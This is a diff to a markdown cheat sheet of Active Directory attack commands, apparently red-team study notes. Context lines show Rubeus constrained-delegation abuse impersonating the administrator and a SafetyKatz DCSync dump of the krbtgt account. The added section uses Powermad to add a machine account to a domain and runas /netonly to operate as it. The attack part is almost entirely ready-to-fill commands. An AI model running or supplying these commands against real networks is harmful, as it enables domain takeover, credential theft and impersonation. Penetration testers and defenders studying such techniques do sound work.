@@ -11,6 +11,7 @@
   * [SecurityDescriptor - Powershell Remoting](#SecurityDescriptor---Powershell-Remoting)
   * [SecurityDescriptor - Remote Registry](#SecurityDescriptor---Remote-Registry)
   * [msDS-AllowedToDelegateTo](#msDS-AllowedToDelegateTo)
+* [Computer Account](#Computer-Account)
 
 
 ## Golden ticket
@@ -310,4 +311,18 @@ Rubeus.exe hash /password:Password@123! /user:<USER> /domain:<DOMAIN>
 Rubeus.exe s4u /user:<USER> /rc4:<NTLM HASH> /impersonateuser:administrator /msdsspn:ldap/<FQDN DC> /domain:<DOMAIN> /ptt
 
 C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
+```
+
+## Computeraccount
+- https://github.com/Kevin-Robertson/Powermad
+- Low privilege if not added to the domain admins group
+
+#### Add computeraccount to the domain
+```
+New-MachineAccount -Domain <DOMAIN> -MachineAccount <NAME OF MACHINE TO ADD> -DomainController <IP> -Verbose
+```
+
+### Runas computeraccount
+```
+runas /netonly /user:<DOMAIN>\<COMPUTERACCOUNTNAME> powershell
 ```
